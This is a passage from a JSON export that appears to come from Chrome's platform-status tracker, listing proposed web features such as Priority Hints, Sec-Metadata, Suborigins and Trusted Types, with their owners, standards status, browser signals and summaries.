        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=612954",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Two main aspects to this feature: \r\n1) Give an embedding page the ability to delegate permissions (such as geolocation) to iframes that are embedded within it. \r\n2) Impose a restriction which prevents iframes from acquiring a permission unless the iframe’s embedder  has explicitly delegated it.\r\n\r\nSee https://noncombatant.github.io/permission-delegation-api/",
    "id": 5670617353289728,
    "resources": {
      "docs": [
        "Spec: https://noncombatant.github.io/permission-delegation-api/",
        "https://lists.w3.org/Archives/Public/public-webappsec/2016Apr/0041.html",
        "https://lists.w3.org/Archives/Public/public-webappsec/2016Mar/thread.html#msg34",
        "https://docs.google.com/document/d/1iaocsSuVrU11FFzZwy7EnJNOwxhAHMroWSOEERw5hO0/edit"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:16.718500",
      "by": "ericbidelman@google.com"
    },
    "name": "Phone number API",
    "tags": [
      "SMS",
      "signup",
      "phone"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "vasilii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/670299",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows a site to retrieve the phone number of the user. As a separate step a site can verify it via SMS.",
    "id": 6642364835692544,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Zn_aiPwYZqFz_2qfBL3XYvvE_I8S7W2XjjrHHxo_frw/edit"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-12 15:54:05.617770",
      "by": "addyo@google.com"
    },
    "name": "Priority Hints",
    "tags": [
      "priority-hints",
      "priority hints"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/priority-hints/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "addyo@chromium.org",
          "domfarolino@gmail.com",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "flag": false,
        "bug": "https://crbug.com/821464",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Priority Hints provide developers with the control to indicate a resource's relative importance to the browser, giving developers more control over the order resources are loaded in.\r\n\r\nMany factors influence a resource's priority in browsers. These include type, visibility and preload status of a resource. Priority Hints introduce a developer-set \"importance\" attribute allowing developers to influence the computed priority of a resource. Supported importance values will be auto, low and high.",
    "id": 5273474901737472,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-16 21:36:21.552870",
      "by": "shampson@chromium.org"
    },
    "name": "RTCIceTransport",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "shampson@chromium.org",
          "steveanton@chromium.org",
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement the RTCIceTransport, a standalone network transport that allows application access to information about the ICE transport over which packets are exchanged. The ICE protocol manages peer-to-peer connections and is designed to work around issues that block these connections like NATs and firewalls using technologies such as STUN and TURN. This is defined in an extension specification that allows for construction without an offer/answer exchange using a WebRTC PeerConnection.",
    "id": 6276032524976128,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/12oNEcgjAjQERMvATCVCWpoTxNU47NRUzxCK5g0FysTk/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-25 16:25:41.217506",
      "by": "orphis@google.com"
    },
    "name": "RTCRtpSender / RTCRtpReceiver.getCapabilities()",
    "comments": "Security concern: getCapabilities() could be used for fingerprinting. Since there is usually a strong correlation between the browser version and the supported capabilities and it might not be significant.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#dom-rtcrtpsender-getcapabilities",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "orphis@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The getCapabilities() method returns the most optimistic view of the capabilities of the system for sending media of the given kind. It does not reserve any resources, ports, or other state but is meant to provide a way to discover the types of capabilities of the browser including which codecs or RTP extensions may be supported.",
    "id": 6206698196828160,
    "resources": {
      "docs": [
        "RTCRtpSender.getCapabilities(): https://w3c.github.io/webrtc-pc/#dom-rtcrtpsender-getcapabilities",
        "RTCRtpReceiver.getCapabilities(): https://w3c.github.io/webrtc-pc/#dom-rtcrtpreceiver-getcapabilities"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-10-13 12:56:38.971380",
      "by": "shanmuga.m@samsung.com"
    },
    "name": "Remove ImageCapture.setOptions()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/image-capture/#imagecaptureapi",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "nikhil.sahni@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ImageCapture"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=771283",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove ImageCapture.setOptions() from idl\r\nand related code according to [1].\r\n\r\n[1] - https://github.com/w3c/mediacapture-image/pull/150/files#diff-ec9cfa5f3f35ec1f84feb2e59686c34dL54\r\n\r\n",
    "id": 5552970657693696,
    "resources": {
      "docs": [
        "https://www.w3.org/TR/image-capture/#imagecaptureapi"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-07-04 12:10:08.357870",
      "by": "tnagel@google.com"
    },
    "name": "Remove OS build number from user-agent string",
    "comments": "Sample user-agent string before the change:\r\n\"Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36\"\r\n\r\nThe same string with build number removed:\r\n\"Mozilla/5.0 (Linux; Android 8.1.0; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36\"\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc7231#section-5.5.3",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "tnagel@chromium.org",
          "torne@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=860229",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://twitter.com/rmondello/status/943545865204989953",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the OS build number (e.g. “NJH47F” or “OPM4.171019.021.D1” on Android) from the user-agent identification, i.e. the User-Agent header and navigator.userAgent.\r\n\r\nThis is to prevent abuse of that information such as exploit targeting and fingerprinting. Also to bring Chrome closer in line with RFC 7231 section 5.5.3.",
    "id": 4558585463832576,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-02-13 01:03:33.158120",
      "by": "meacer@chromium.org"
    },
    "name": "Remove: Content initiated top frame navigations to filesystem URLs",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "meacer@chromium.org",
          "emilyschechter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=811558",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We intent to block web pages from loading filesystem: URLs in the top frame.\r\n\r\nfilesystem: URLs are only supported by Chrome. They contain an inner URL which consists of the origin that created the filesystem URL. For example, a filesystem URL created by http://example.com looks like filesystem:http://www.example.com/temporary/file0. The appearance in the omnibox is confusing for users, and there is currently an undisclosed security bug for this.\r\n\r\nThis change does NOT affect file:// URLs.",
    "id": 5736128644644864,
    "resources": {
      "docs": [
        "https://bugs.chromium.org/p/chromium/issues/detail?id=811558"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-05-24 09:31:15.223120",
      "by": "mkwst@chromium.org"
    },
    "name": "Sec-Metadata",
    "comments": "For example, it's unlikely that a bank's \"Transfer all money\" endpoint would be referenced from an img tag, and likewise unlikely that evil.com is going to be making any legitimate requests whatsoever. Ideally, the server could reject these requests a priori rather than deliver them to the application backend.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/mikewest/sec-metadata",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/fetch/issues/700",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=843478",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This introduces a new HTTP request header that sends additional metadata about a request's provenance (is it cross-site, is it triggered from `<img>`, etc) to the server in order to allow it to make security decisions which might mitigate some kinds of attacks based on timing the server's response (cross-site search, and others).",
    "id": 5155867204780032,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:52.932400",
      "by": "ericbidelman@google.com"
    },
    "name": "Send Mouse Events to Disabled Form Controls",
    "comments": "FireFox has shipped a subset of events (it does not post mouseup, mousedown and auxclick)",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#enabling-and-disabling-form-controls:-the-disabled-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/177#issuecomment-282022587",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://crbug.com/696686",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Events that have no activation behavior should be sent to form controls. That is the HTML Spec specifically identifies that \"click\" should be prevented to disabled form controls but it appears that all mouse events aren't sent to form controls. This proposal changes that all mouse events (other than click) are sent to disabled form controls.",
    "id": 5685077795143680,
    "resources": {
      "docs": [
        "https://jakearchibald.com/2017/events-and-disabled-form-fields/",
        "https://github.com/w3c/pointerevents/issues/177"
      ],
      "samples": [
        "http://jsbin.com/botohet/edit?js,output"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:55.955620",
      "by": "ericbidelman@google.com"
    },
    "name": "Shoutcast support",
    "tags": [
      "Shoutcast",
      "ICY"
    ],
    "comments": "This will make Shoutcast a de facto standard, which is unfortunate, but it's enough of a problem that this seems best for users.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mmenke@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network"
        ],
        "flag": false,
        "bug": "https://crbug.com/669800",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "HTTP/0.9 support on non-default ports needs to be removed to fix a security issue.  Shoutcast relies on this and is sufficiently common that we need an exception for it.",
    "id": 5703452101443584,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:34.937360",
      "by": "ericbidelman@google.com"
    },
    "name": "Speech Recognition with WebRTC",
    "tags": [
      "speech recognition",
      "webrtc",
      "media stream track",
      "echo cancellation",
      "video conference",
      "video chat"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "burnik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/408940",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Chrome supports speech recognition for use cases like voice search and voice input. The API is exposed to web developers via JavaScript's webkitSpeechRecognition object. Current implementation does not support more extensive use cases like video chat transcriptions or video conferencing. \r\n",
    "id": 5043404337577984,
    "resources": {
      "docs": [
        "http://goo.gl/9Ot3PC"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:29:05.535440",
      "by": "ericbidelman@google.com"
    },
    "name": "Standby API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "bogdanovichiy@yandex-team.ru"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=257511",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The API would prevent the device from entering a power-saving state (e.g. turning off the screen).",
    "id": 5768542523752448,
    "resources": {
      "docs": [
        "http://w3c.github.io/screen-wake/",
        "http://boiler23.github.io/screen-wake/"
      ],
      "samples": [
        "http://w3c-webmob.github.io/wake-lock-use-cases/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:01.372260",
      "by": "ericbidelman@google.com"
    },
    "name": "Strictly block \"blockable\" mixed content",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec/specs/mixedcontent/#requirements-user-controls",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/513163",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently, Chrome blocks blockable mixed content, and displays a shield icon to users, allowing them to unblock that content for a particular page view. We should stop doing that by default, and lock the icon behind a CLI flag (or kill it entirely).",
    "id": 5738853059002368,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:42.585110",
      "by": "ericbidelman@google.com"
    },
    "name": "Suborigins",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://metromoxie.github.io/webappsec/specs/suborigins/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "jww@chromum.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/555117",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Provides a mechanism for a server to specify a new origin for a page to run in that is named and contained within the same physical (scheme/host/port) origin. For example, an application running at https://google.com/foo which the server places in the Suborigin namespace Foo will run in a new origin based on the tuple (https, google.com, 443, Foo). This would be considered a different origin space from (https, google.com, 443) or (https, google.com, 443, Bar)",
    "id": 5569465034997760,
    "resources": {
      "docs": [
        "https://www.chromium.org/developers/design-documents/per-page-suborigins"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:06.959100",
      "by": "ericbidelman@google.com"
    },
    "name": "Support for old constraints with the new syntax",
    "comments": "getUserMedia and constraints are a standardized feature, but chrome provides support for extra features through a nonstandard constraint syntax, and this proposal consists of adding support for those features using the new syntax.\r\n",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/mediacapture-main/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GetUserMedia"
        ],
        "flag": false,
        "bug": "http://crbug.com/709931",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chromium currently supports two different syntaxes for specifying video and audio constraints for the getUserMedia function. The old syntax has support for one set of constraints, including several nonstandard ones, and the new syntax has support for a different set of constraints, all of which are standardized. This proposal consists in adding support for all constraints with the new syntax so that the old nonstandard syntax can be deprecated.",
    "id": 5838698172121088,
    "resources": {
      "samples": [
        "https://webrtc.github.io/samples/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-23 14:42:46.024710",
      "by": "jmedley@google.com"
    },
    "name": "TextEncoderStream and TextDecoderStream APIs",
    "tags": [
      "TextEncoder",
      "TextDecoder",
      "TransformStream",
      "ReadableStream",
      "WritableStream",
      "transform streams"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ricea@chromium.org",
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>StreamsAPI"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=845427",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This change integrates the Encoding Standard with the Stream Standard. It enables developers to easily convert streams of binary data to text and vice-versa. This is generally useful when working with streams of text, and fills a vital need when used with the Fetch API.",
    "id": 4881011259211776,
    "resources": {
      "docs": [
        "https://github.com/ricea/encoding-streams/blob/master/stream-explainer.md"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-09-18 11:09:31.330740",
      "by": "mkwst@chromium.org"
    },
    "name": "Trusted Types for DOM Manipulation",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://crbug.com/739170",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature introduces a number of types meant to capture the kinds of strings that developers wish to inject into a document via sinks such as `innerHTML`. These types might perform autoescaping, or might allow explicitly unsafe assignment. These new types in place, it adds variants of those setters and methods that accept the new types, and gives developers ways of locking themselves out of using the `DOMString` variants.",
    "id": 5650088592408576,
    "resources": {
      "docs": [
        "https://github.com/mikewest/trusted-types"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-31 03:19:04.262170",
      "by": "cnardi@chromium.org"
    },
    "name": "Unprefix webkit-image-set and update syntax per spec",
    "tags": [
      "image",
      "image-set"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-images-4/#image-set-notation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1107646",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://crbug.com/630597",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/cssimageset/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=159373",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSS image-set function has been shipped under the webkit prefix for many versions. However, our implementation has not been per the spec, as only URL values were accepted for the image, and only resolutions with 'x' as a unit were accepted. This changes our implementation to match the spec, accepting all <image> types or a <string> for the image, and all <resolution> types for the resolution. After these changes, image-set will be unprefixed.",
    "id": 5432024223449088,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/background-image#image-set()"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-06-05 16:49:10.439630",
      "by": "dtapuska@google.com"
    },
    "name": "User Activation Query API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/dtapuska/useractivation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://crbug.com/836826",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
